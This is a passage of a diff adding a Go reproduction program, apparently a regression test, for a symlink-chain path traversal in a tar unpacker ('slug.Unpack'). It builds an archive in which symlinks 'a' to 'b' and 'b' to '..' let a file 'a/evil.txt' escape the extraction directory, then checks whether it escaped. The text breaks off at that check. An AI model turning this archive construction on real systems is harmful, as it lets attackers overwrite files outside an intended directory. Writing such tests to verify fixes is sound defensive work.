+
+func main() {
+tmpDir, err := os.MkdirTemp("", "repro-")
+if err != nil {
+log.Fatal(err)
+}
+defer os.RemoveAll(tmpDir)
+
+unpackDir := filepath.Join(tmpDir, "unpack")
+if err := os.Mkdir(unpackDir, 0755); err != nil {
+log.Fatal(err)
+}
+
+var tarBuf bytes.Buffer
+gzipW := gzip.NewWriter(&tarBuf)
+tarW := tar.NewWriter(gzipW)
+
+// Symlink `a` -> `b`
+hdr1 := &tar.Header{
+Name:     "a",
+Typeflag: tar.TypeSymlink,
+Linkname: "b",
+Mode:     0777,
+}
+if err := tarW.WriteHeader(hdr1); err != nil {
+log.Fatal(err)
+}
+
+// Symlink `b` -> `..`
+hdr2 := &tar.Header{
+Name:     "b",
+Typeflag: tar.TypeSymlink,
+Linkname: "..",
+Mode:     0777,
+}
+if err := tarW.WriteHeader(hdr2); err != nil {
+log.Fatal(err)
+}
+
+// File `a/evil.txt` -> `b/evil.txt` -> `../evil.txt`
+hdr3 := &tar.Header{
+Name: "a/evil.txt",
+Mode: 0644,
+Size: int64(len("pwned")),
+}
+if err := tarW.WriteHeader(hdr3); err != nil {
+log.Fatal(err)
+}
+if _, err := tarW.Write([]byte("pwned")); err != nil {
+log.Fatal(err)
+}
+
+if err := tarW.Close(); err != nil {
+log.Fatal(err)
+}
+if err := gzipW.Close(); err != nil {
+log.Fatal(err)
+}
+
+err = slug.Unpack(bytes.NewReader(tarBuf.Bytes()), unpackDir)
+if err != nil {
+// This is expected if the code is patched
+fmt.Printf("Unpack failed: %v\n", err)
+}
+
+// Check if the file was created
+if _, err := os.Stat(filepath.Join(tmpDir, "evil.txt")); err == nil {
